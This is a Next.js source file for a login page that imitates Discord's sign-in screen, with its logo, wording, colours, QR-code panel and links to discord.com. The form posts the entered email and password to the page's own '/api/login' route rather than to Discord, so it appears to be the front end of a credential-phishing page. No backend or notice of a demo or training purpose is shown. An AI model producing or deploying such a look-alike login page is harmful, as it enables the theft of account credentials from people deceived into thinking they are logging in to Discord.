"use client";

import { useState } from "react";
import Image from "next/image";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Separator } from "@/components/ui/separator";
import { Card } from "@/components/ui/card";
import QRCode from "@/components/qr-code";
import { StarBackground } from "@/components/star-background";
import { Loader2 } from "lucide-react";

export default function LoginPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleLogin = async () => {
    setIsLoading(true);
    const response = await fetch("/api/login", {
      method: "POST",
      body: JSON.stringify({ e: email, p: password }),
    });

    if (response.ok) {
      setIsLoading(false);
      const data = await response.json();
      console.log(data);
      alert("Login successful");
    } else {
      setIsLoading(false);
      alert("Login failed");
    }
  };

  return (
    <div className="min-h-screen relative flex items-center justify-center overflow-hidden bg-gradient-to-br from-[#120935] via-[#2c2fa3] to-[#0890f6]">
      <StarBackground />

      {/* Discord Logo */}
      <div className="absolute top-8 left-8">
        <a href="https://discord.com">
          <div className="flex items-center gap-2">
            <Image
              src="https://ext.same-assets.com/3025471085/2487800819.svg+xml"
              alt="Discord"
              width={130}
              height={40}
              className="w-32"
            />
          </div>
        </a>
      </div>

      {/* Login Box */}
      <Card className="w-[800px] bg-[#2f3136]/80 backdrop-blur-sm shadow-xl rounded-md border-none text-white overflow-hidden">
        <div className="flex">
          {/* Left Section: Login Form */}
          <div className="flex-1 p-8">
            <h1 className="text-2xl font-bold mb-2">Welcome back!</h1>
            <p className="text-[#b9bbbe] mb-6">
              We're so excited to see you again!
            </p>

            <div className="space-y-4">
              <div className="space-y-2">
                <label
                  htmlFor="email"
                  className="block text-xs uppercase font-semibold text-[#b9bbbe]"
                >
                  Email or Phone Number<span className="text-red-500">*</span>
                </label>
                <Input
                  id="email"
                  type="text"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="bg-[#1e1f22] border-[#222327] text-white"
                  required
                />
              </div>

              <div className="space-y-2">
                <label
                  htmlFor="password"
                  className="block text-xs uppercase font-semibold text-[#b9bbbe]"
                >
                  Password<span className="text-red-500">*</span>
                </label>
                <Input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="bg-[#1e1f22] border-[#222327] text-white"
                  required
                />
              </div>

              <Button
                variant="link"
                className="text-[#00a8fc] p-0 h-auto text-sm font-bold hover:underline"
              >
                Forgot your password?
              </Button>

              <Button
                onClick={handleLogin}
                className="w-full bg-[#5865f2] hover:bg-[#4752c4] text-white font-bold"
              >
                {isLoading ? <Loader2 className="animate-spin" /> : "Log In"}
              </Button>

              <div className="text-sm text-[#b9bbbe]">
                Need an account?{" "}
                <a href="https://discord.com/login">
                  <Button
                    variant="link"
                    className="text-[#00a8fc] p-0 h-auto text-sm font-bold hover:underline"
                  >
                    Register
                  </Button>
                </a>
              </div>
            </div>
          </div>

          {/* Separator */}
          <Separator orientation="vertical" className="bg-[#42444a]" />

          {/* Right Section: QR Code */}
          <div className="flex-1 p-8 flex flex-col items-center justify-center">
            <QRCode />
            <h2 className="text-2xl font-bold mt-6 mb-2">
              Log in with QR Code
            </h2>
            <p className="text-[#b9bbbe] text-center">
              Scan this with the <strong>Discord mobile app</strong> to log in
              instantly.
            </p>
            <a href="https://discord.com/login">
              <Button
                variant="link"
                className="text-[#00a8fc] mt-4 h-auto text-sm font-bold hover:underline"
              >
                Or, sign in with passkey
              </Button>
            </a>
          </div>
        </div>
      </Card>
    </div>
  );
}
